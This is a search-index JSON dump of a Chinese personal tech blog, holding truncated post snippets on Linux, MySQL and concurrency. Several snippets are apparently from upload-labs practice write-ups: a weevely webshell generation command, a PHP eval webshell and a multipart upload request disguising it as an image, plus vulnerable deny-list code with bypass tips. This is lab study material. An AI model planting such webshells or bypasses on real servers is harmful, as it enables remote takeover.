permission","lvl1":null,"lvl2":"摘要","objectID":"6a068bdf3442dd24450ec08f237fbad0","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/linix-file-permission/"},{"content":"文件存储结构 大部分的Linux文件系统（如ext2、ext3）规定，一个文件由目录项、inode和数据块组成 目录项：包括文件名和inode节","lvl0":"linux file storage_inode","lvl1":null,"lvl2":"摘要","objectID":"d1369e47298a39ca41219662fb2662e5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/linux_file_storage_inode/"},{"content":"文件系统原理 学习教程 需要理解的概念 名字 概念 inode 操作系统用于管理和存储文件的信息软件被称为文件系统，， 文件是文件数据和文件元信息组成的，文件的i","lvl0":"linux inode 文件系统原理","lvl1":null,"lvl2":"摘要","objectID":"cb5fc76af1c0138d8911df57378dac26","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux_inode%E5%8E%9F%E7%90%86/"},{"content":"weevely 工具教程 参考文档 1 2 3 4 5 6 7 git clone git@github.com:epinna/weevely3.git # Make sure that the python package manager and yaml libraries are installed sudo apt-get install -y python3 python3-pip curl cd weevely3/ sudo pip3 install -r requirements.txt --upgrade 生成木马 文件 1 2 ./weevely.py generate webshell webshell.php # 本地生成 webshell\\ 密码 webshell 连接","lvl0":"linux weevely工具","lvl1":["linux"],"lvl2":"摘要","objectID":"66329b5a232d7c60862421f96acb282c","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/linux%E4%B8%8B%E8%8F%9C%E5%88%80/"},{"content":"linux x86架构 CPU 对于一个计算机来讲，最核心的就是CPU（Central Processing Unit，中央处理器）。这是这台计算机的大脑，所有的设备都围绕它展开。","lvl0":"linux x86架构【linux体系学习】","lvl1":null,"lvl2":"摘要","objectID":"37ac5d318a67c922adfe3b0c37a3d06c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux-x86%E6%9E%B6%E6%9E%84/"},{"content":"安装 centos centos 下载地址 这里我选择 安装 标准版本的 CentOS-7.0-x86_64-DVD-1503-01.iso 配置 ssh免登录 [[post/14.新语言学习记录/linux/ssh/linux免登陆踩坑]] ubuntu","lvl0":"linux安装教程","lvl1":null,"lvl2":"摘要","objectID":"4da66cefaaacc61700379fa5f0c9c71c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/ssh/linux%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"},{"content":"linux 下部署前端程序总结 上来就删除 yarn.lock, package-lock.json 等文件 yarn 安装依赖 yarn dev 运行 即可 杀端口，自动部署命令等 1 2 3 lsof -i :8080 # list open file , 8080 端口的 systemctl status ssh","lvl0":"linux部署前端程序","lvl1":null,"lvl2":"摘要","objectID":"5c6147391d380518af47e5160fb505a2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E9%83%A8%E7%BD%B2%E5%89%8D%E7%AB%AF-node%E7%A8%8B%E5%BA%8F%E7%AD%89/"},{"content":"常见的 调优命令 top uptime","lvl0":"linux调优_系统负载","lvl1":null,"lvl2":"摘要","objectID":"c19e8af083c56ce34540ac8e714eb7ab","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E8%B0%83%E4%BC%98_%E7%B3%BB%E7%BB%9F%E8%B4%9F%E8%BD%BD/"},{"content":"linux多线程下载工具 参考博客-工具 axel 1 sudo apt-get install axel 使用示例 1 2 axel -n 32 https://github.com/criyle/go-judge/releases/download/v1.3.9/executorserver-amd64 # 这里我开了 32 个线程下载","lvl0":"linux多线程下载工具","lvl1":null,"lvl2":"摘要","objectID":"0181aef71b4053ea5eefb68cf6bc8ca5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/ssh/linux%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7/"},{"content":"学习教程 普通文件（-） 从Linux的角度来说，类似mp4、pdf、html这样应用层面上的文件类型都属于普通文件 Linux用户可以根据访问权","lvl0":"linux分区原理","lvl1":["Linux文件系统原理"],"lvl2":"摘要","objectID":"58344982ed7fdf20f5406e03b6256eb2","tags":["linux文件系统原理"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/%E5%88%86%E5%8C%BA/"},{"content":"ssh介绍 安装 ssh 1 2 # 安装 yum install -y openssl openssh-server ssh 设置开机启动 1 2 3 4 sudo systemctl enable ssh # 重启 sshd # systemctl restart sshd.service service sshd restart linux 免登陆踩坑 首先 要确保 你的linux 服务器要开启 公钥","lvl0":"linux免登陆","lvl1":null,"lvl2":"摘要","objectID":"0fd40a676ef044ec6f3a44704583bd59","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/ssh/linux%E5%85%8D%E7%99%BB%E9%99%86%E8%B8%A9%E5%9D%91/"},{"content":"虚拟地址空间原理 学习视频 Linux 为每个运行程序（进程） 操作系统都会为其分配一个 0 ~ 4G 的地址空间 (虚拟地址空间) 进程： 正在运行的程序 Linux 下 可执行文件格","lvl0":"linux文件读写API","lvl1":null,"lvl2":"摘要","objectID":"3b2a8ec38de99feb34fa1219f0b18b49","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/linux%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99api/"},{"content":"4. 表内容操作 4.1. 增 1 2 3 4 5 6 insertinto表(列名,列名...)values(值,值,...)insertinto表(列名,列名...","lvl0":"linux下MYSQL crud commands","lvl1":["linux"],"lvl2":"摘要","objectID":"db97f02a7105495a4d09db5f2f7af5ce","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/mysql/crud_commands/"},{"content":"2. 数据库操作 1 2 3 4 5 6 7 8 #创建数据库createdatabase\u0026lt;数据库名\u0026gt;#显示数据库showdatabases#删除数据","lvl0":"linux下MYSQL table-operation","lvl1":["linux"],"lvl2":"摘要","objectID":"fe5b4a127661652904eaf6e2fb85f52a","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/mysql/table-operation/"},{"content":"1. 系统管理 1.1. 连接mysql 格式： mysql -h主机地址 -u用户名 －p用户密码 1 2 3 4 5 6 7 8 #连接本地 mysql -h\u0026lt;localhost/127.0.0.1\u0026gt; -u用户名 －p用户密码 #连接远程 mysql -h\u0026l","lvl0":"linux下MYSQL的管理","lvl1":["linux"],"lvl2":"摘要","objectID":"b26b148238fc5a2903f9a210d47bdc9d","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/mysql/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86/"},{"content":"1 2 3 4 ifconfig :\u0026lt;\u0026lt;EOF eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 EOF 由命令可知： linux下的 MTU 为 1500 个字节 1 net.ipv4.tcp_sack = 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ping -s 1460 -M do baidu.com :\u0026lt;\u0026lt;EOF PING baidu.com (220.181.38.148) 1460(1488) bytes of data.","lvl0":"linux下的MTU","lvl1":["linux"],"lvl2":"摘要","objectID":"53eafcafb943dc2a28a577a9be63f74f","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/linux%E4%B8%8B%E7%9A%84-mtu/"},{"content":"linux 下进程和线程 其实在Linux内核2.4版以前，线程的实现和管理方式就是完全按照进程方式实现的。在2.6版内核以后才有了单独的线程实现。 进程","lvl0":"linux下进程和线程","lvl1":null,"lvl2":"摘要","objectID":"81249a562fa928b0a01057e9ef593d57","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/linux%E4%B8%8B%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/"},{"content":"进程控制函数 孤儿进程和僵尸进程 经验： 很多时候 我们会让子进程先退出，然后再退出父进程 如果父进程先死亡， 那么 子进程就是孤儿进程【很容易理解】 僵尸","lvl0":"linux下进程控制","lvl1":null,"lvl2":"摘要","objectID":"fe8eaf0e0588858ba726d50debc5bfcd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/linux%E4%B8%8B-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6fork/"},{"content":"LongAdder源码学习 学习视频参考 在 JDK1.8 中，Java 提供了一个新的原子类 LongAdder。LongAdder 在高并发场景下会比 AtomicInteger 和 AtomicLong 的性","lvl0":"LongAdder源码","lvl1":null,"lvl2":"摘要","objectID":"31de82052c8ddb2ea20d2b3b74453843","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/longadder-%E6%BA%90%E7%A0%81/"},{"content":"lsof 恢复文件 list open file 进程 打开了某个文件，只要进程不死，这个文件处于被打开状态， 这个文件虽然被删除了 我们也可以重新恢复这个文件 如果进程重启了，文件","lvl0":"lsof恢复文件","lvl1":["Linux文件系统原理"],"lvl2":"摘要","objectID":"8d5e8913e110bedc668b8a5bd5bdb982","tags":["linux文件系统原理"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/lsof%E6%81%A2%E5%A4%8D%E6%96%87%E4%BB%B6/"},{"content":"","lvl0":"makefile原理","lvl1":null,"lvl2":"摘要","objectID":"ed37af8d084842b18bae1d05b73d1fc3","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/makefile%E5%8E%9F%E7%90%86/"},{"content":"man的使用方法 1 2 3 man setfacl # 输入 /EXAMPLE 查找 示例","lvl0":"man的正确使用方法","lvl1":null,"lvl2":"摘要","objectID":"6d4e76e0498932599a1e2e3ac47ac34f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/man-%E7%9A%84%E6%AD%A3%E7%A1%AE%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F/"},{"content":"maven 传递依赖 相关参考博客","lvl0":"maven传递依赖","lvl1":null,"lvl2":"摘要","objectID":"2db12bcaa25df9026d4695e815d5103d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/maven%E7%9B%B8%E5%85%B3/"},{"content":"Mutex 使用 Mutex 是使用最广泛的同步原语（Synchronization primitives，有人也叫做并发原语。我们在这个课程中根据英文直译优先用同","lvl0":"Mutex","lvl1":null,"lvl2":"摘要","objectID":"31897cdc3202a0dd7b36513e61b8ff86","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/mutex/"},{"content":"MySQL 数据库开发的三十六条军规 一、核心军规(5) 1.1 尽量不在数据库做运算 别让脚趾头想事情，那是脑瓜子的职责 让数据库多做她擅长的事: 尽量不在数据库做","lvl0":"mysql开发注意事项","lvl1":null,"lvl2":"摘要","objectID":"f288881cc4176f79c005bdd25336826f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/mysql%E5%BC%80%E5%8F%91%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"},{"content":"mysql 索引原理 什么是回表 回表的概念，去根据索引搜索到 数据，但是索引中没有要查找的数据，就要去定位到那个行，去把数据行中的数据搜索出来【这个就是回","lvl0":"mysql索引原理","lvl1":null,"lvl2":"摘要","objectID":"f1873330c6d84b0ee625afd194a644d2","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/mysql-%E7%B4%A2%E5%BC%95/"},{"content":"mysql慢查询怎么优化 检查是否走了索引，如果没有，优化 SQL 利用索引 检查 利用的索引是否是最优索引，没有的话，尽量用最优索引 检查所查字段是否是必","lvl0":"mysql相关","lvl1":null,"lvl2":"摘要","objectID":"2826c10a4722271e7b01415ca51a2454","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/mysql%E7%9B%B8%E5%85%B3/"},{"content":"neo4j 基本概念 参考学习教程 neo4j的数据模型 neo4j cql 图数据库 通过apache lucene 索引 支持unique 约束 包含一个用于执行 cql 命令的 UI： NEO4J 数据库浏览器","lvl0":"neo4j基本概念","lvl1":null,"lvl2":"摘要","objectID":"6262d4c80cc20f6148102308374233ef","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93/neo4j/neo4j%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"},{"content":"NIO 的应用 BIO 这种线程模型适用于 socket 连接不是很多的场景；但是现在的互联网场景，往往需要服务器能够支撑十万甚至百万连接，而创建十万甚至上百万个线程显","lvl0":"Netty框架原理剖析","lvl1":null,"lvl2":"摘要","objectID":"780ce43977d4ecae69ec39e6d26bd805","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E6%A1%86%E6%9E%B6%E6%A1%88%E4%BE%8B/netty%E4%BA%86%E8%A7%A3/"},{"content":"NIO原理 设置一个场景， 从 socket里面读取数据，读到 \u0026lsquo;\\n\u0026rsquo; 为止，把读到的数据写入到另一个 socket里面，这个就是 c 和 java nio的2种实现 ne","lvl0":"netty线程模型【nio-reactor】","lvl1":null,"lvl2":"摘要","objectID":"a760a2c9da08f9cd012f1d32a9d35918","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/netty-%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8Bnio-reactor%E6%A8%A1%E5%9E%8B/"},{"content":"nj模板引擎 学习教程 官网地址 1 2 3 4 5 6 7 //配置模板引擎 config.view = { defaultExtension:\u0026#39;.nj\u0026#39;, defaultViewEngine:\u0026#39;nunjucks\u0026#39;, }","lvl0":"nj模板引擎","lvl1":null,"lvl2":"摘要","objectID":"97de03c40a564baa12cefc4676b230ff","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/nodejs/nj%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E/"},{"content":"nmap nmap工具原理 1 nmap扫描主要有 TCP 全连接扫描（会被扫描机器留下记录）， 半连接扫描（不会留下记录） nmap使用入门 1 2 3 nmap -h # 查看帮助信","lvl0":"nmap工具使用","lvl1":null,"lvl2":"摘要","objectID":"0c493708be359fb9d3c08d5c73b19559","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/kali%E5%9F%BA%E7%A1%80/nmap%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86/"},{"content":"ljudge框架 https://github.com/quark-zju/ljudge","lvl0":"nodejs调用服务器命令脚本","lvl1":null,"lvl2":"摘要","objectID":"3cca5632c1c02766b6d30ac7e86c5d40","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/nodejs/nodejs-%E8%B0%83%E7%94%A8-python%E8%84%9A%E6%9C%AC/"},{"content":"安装OJ 环境的过程 安装的文档 2.1、安装安全计算模型 libseccomp RunC 默认的编译配置是支持 seccomp 的，所以我们需要先安装libseccomp, 如果是centos","lvl0":"OJ 环境安装","lvl1":null,"lvl2":"摘要","objectID":"820c5da355cf6c2a7bae73481fad27b7","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/oj%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"},{"content":"OJ沙盒的使用 参考项目 沙盒 设置绝对路径 默认文件存储在内存里，使用 -dir 指定本地目录为文件存储 1 ./sandbox -dir \u0026#34;./temp\u0026#34; 测试 python 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19","lvl0":"OJ沙盒的使用","lvl1":["OJ"],"lvl2":"摘要","objectID":"4a9a5b40aba03cd6e494d6c8cfd4180b","tags":["OJ"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/oj%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E6%B2%99%E7%9B%92%E4%BD%BF%E7%94%A8/"},{"content":"Once使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;sync\u0026#34; ) func main() { var once sync.Once // 第一个初始化函数 f1 := func() { fmt.Println(\u0026#34;in f1\u0026#34;) } once.Do(f1) // 打印出 in f1 // 第二个初始化函数 f2","lvl0":"Once 单例对象初始化","lvl1":null,"lvl2":"摘要","objectID":"616bbbc315d099e23d29570ca170839e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/once/"},{"content":"upload-labs 01 学习 1 \u0026lt;?php eval($_POST[cmd]) ?\u0026gt; 将 webshell.php 改为 webshell.php.jpg 右键 将findler软件 unlock for editing 允许修改请求头 rules -\u0026gt; breakpoints -\u0026gt; before request 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ------WebKitFormBoundaryxOVc8BMvlOWwyrBX Content-Disposition: form-data; name=\u0026#34;upload_file\u0026#34;; filename=\u0026#34;webshell.php\u0026#34; Content-Type: image/jpeg \u0026lt;?php eval($_POST[cmd]) ?\u0026gt; ------WebKitFormBoundaryxOVc8BMvlOWwyrBX Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; 上","lvl0":"pass-01","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"6b6a87be618ba79a4a06fbdae8c3449c","tags":["文件上传漏洞","kali linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-01/"},{"content":"分析源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/jpeg\u0026#39;) || ($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/png\u0026#39;) || ($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/gif\u0026#39;)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; . $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg =","lvl0":"pass-02 【修改请求头】","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"44cabaa4d881ec7f7c0f77daff3118ee","tags":["文件上传漏洞","kali linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-02/"},{"content":"黑名单绕过 .htaccess 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.php1\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.pHp1\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name","lvl0":"pass-02 【修改请求头】","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"55702d3dfe3353acf7936cb80ed8f03c","tags":["文件上传漏洞","kali linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/upload-labs/pass-04/"},{"content":"文件后缀名检查绕过 只是定义了 .php 的黑名单，我们可以发送 .php3文件后缀绕过 黑名单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $is_upload = false;","lvl0":"pass-03 【php3绕过黑名单】","lvl1":["文件上传漏洞"],"lvl2":"摘要","objectID":"7427c55512d63ef5acd6e1c171422ceb","tags":["文件上传漏洞","kali 